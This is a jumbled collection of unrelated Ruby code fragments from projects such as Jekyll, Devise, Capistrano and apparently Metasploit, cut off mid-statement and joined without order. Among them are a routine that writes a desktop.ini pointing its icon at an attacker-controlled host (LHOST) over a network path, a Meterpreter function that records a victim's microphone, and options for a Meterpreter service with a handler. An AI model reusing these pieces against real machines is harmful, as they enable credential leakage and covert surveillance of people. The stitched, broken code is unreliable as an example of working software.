
        
            should 'not copy _posts directory' do
      refute_exist dest_dir('_posts')
    end
    
    WITH_LIQUID = <<-LIQUID.freeze
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce auctor libero at
pharetra tempus. {{ author }} et metus fermentum, eu cursus lorem
mattis. Curabitur vel dui et lacus rutrum suscipit et eget neque.
    
          def cell_prefix(status)
        @prefixes[status]
      end
    
    module Jekyll
  module Commands
    class NewTheme < Jekyll::Command
      class << self
        def init_with_program(prog)
          prog.command(:'new-theme') do |c|
            c.syntax 'new-theme NAME'
            c.description 'Creates a new Jekyll theme scaffold'
            c.option 'code_of_conduct', \
                     '-c', '--code-of-conduct', \
                     'Include a Code of Conduct. (defaults to false)'
    
            # For a description of the protocol see
        # http://feedback.livereload.com/knowledgebase/articles/86174-livereload-protocol
        def reload(pages)
          pages.each do |p|
            json_message = JSON.dump(
              :command => 'reload',
              :path    => p.url,
              :liveCSS => true
            )
    
        # The path used after resending confirmation instructions.
    def after_resending_confirmation_instructions_path_for(resource_name)
      is_navigational_format? ? new_session_path(resource_name) : '/'
    end
    
    module Devise
  module Controllers
    # A module that may be optionally included in a controller in order
    # to provide remember me behavior. Useful when signing in is done
    # through a callback, like in OmniAuth.
    module Rememberable
      # Return default cookie values retrieved from session options.
      def self.cookie_values
        Rails.configuration.session_options.slice(:path, :domain, :secure)
      end
    
            users.any?
      end
    
    require 'uri'
    
          def self.generate_helpers!(routes=nil)
        routes ||= begin
          mappings = Devise.mappings.values.map(&:used_helpers).flatten.uniq
          Devise::URL_HELPERS.slice(*mappings)
        end
    
      def create_desktopini
    ini=''
    ini << '[.ShellClassInfo]\n'
    ini << 'IconFile=\\\\#{datastore['LHOST']}\\icon.ico\n'
    ini << 'IconIndex=1337'
    
        # In the case where a plus or slash happened at the end of a chunk,
    # we'll have two dots next to each other, so fix it up.  Note that this
    # is searching for literal dots, not a regex matching any two
    # characters
    b64.gsub!('..', '.')
    
    for segment in macho.segments
  #next if segment.segname == MachO::LoadCommands::SEGMENT_NAMES[:SEG_PAGEZERO]
  puts 'segment: #{segment.segname} off: #{segment.offset.to_s(16)} vmaddr: #{segment.vmaddr.to_s(16)} fileoff: #{segment.fileoff.to_s(16)}'
  for section in segment.sections
    puts 'section: #{section.sectname} off: #{section.offset.to_s(16)} addr: #{section.addr.to_s(16)} size: #{section.size.to_s(16)}'
    flat_addr = section.addr - min
    section_data = data[section.offset, section.size]
    #file_section = section.offset
    #puts 'info: #{segment.fileoff.to_s(16)} #{segment.offset.to_s(16)} #{section.size.to_s(16)} #{file_section.to_s(16)}'
    #puts '?: #{data.size.to_s(16)} #{file_section.to_s(16)}'
    if section_data
      puts 'flat_addr: #{flat_addr.to_s(16)} (#{section_data.size.to_s(16)})'
      if start == -1 or start > flat_addr
        start = flat_addr
      end
      output_data[flat_addr, section_data.size] = section_data
    end
  end
end
    
      # Record from default audio source for +duration+ seconds;
  # returns a low-quality wav file
  def record_mic(duration)
    request = Packet.create_request('webcam_audio_record')
    request.add_tlv(TLV_TYPE_AUDIO_DURATION, duration)
    response = client.send_request(request)
    response.get_tlv(TLV_TYPE_AUDIO_DATA).value
  end
    
    #
# Options
#
opts = Rex::Parser::Arguments.new(
  '-h'  => [ false,  'This help menu'],
  '-r'  => [ false,  'Uninstall an existing Meterpreter service (files must be deleted manually)'],
  '-A'  => [ false,  'Automatically start a matching exploit/multi/handler to connect to the service']
)
    
    unless $LOAD_PATH.include? lib_path
  $LOAD_PATH.unshift lib_path
end

    
    # Include backported features for older versions of Ruby
require 'backports'
    
        register_options(
      [
        OptBool.new('EMBED', [true, 'Use the embed version of the YouTube URL', true]),
        OptString.new('VID', [true, 'The video ID to the YouTube video', 'kxopViU98Xo'])
      ])
  end
    
    TLV_TYPE_AUDIO_DURATION       = TLV_META_TYPE_UINT    | (TLV_EXTENSIONS + 10)
TLV_TYPE_AUDIO_DATA           = TLV_META_TYPE_RAW     | (TLV_EXTENSIONS + 11)
TLV_TYPE_AUDIO_INTERFACE_ID   = TLV_META_TYPE_UINT    | (TLV_EXTENSIONS + 12)
TLV_TYPE_AUDIO_INTERFACE_NAME = TLV_META_TYPE_STRING  | (TLV_EXTENSIONS + 13)
    
      namespace :symlink do
    desc 'Symlink release to current'
    task :release do
      on release_roles :all do
        tmp_current_path = release_path.parent.join(current_path.basename)
        execute :ln, '-s', release_path, tmp_current_path
        execute :mv, tmp_current_path, current_path.parent
      end
    end
    
            if callable_without_parameters?(value_to_evaluate)
          super(key, assert_valid_later(key, value_to_evaluate), &nil)
        else
          assert_valid_now(key, value_to_evaluate)
          super
        end
      end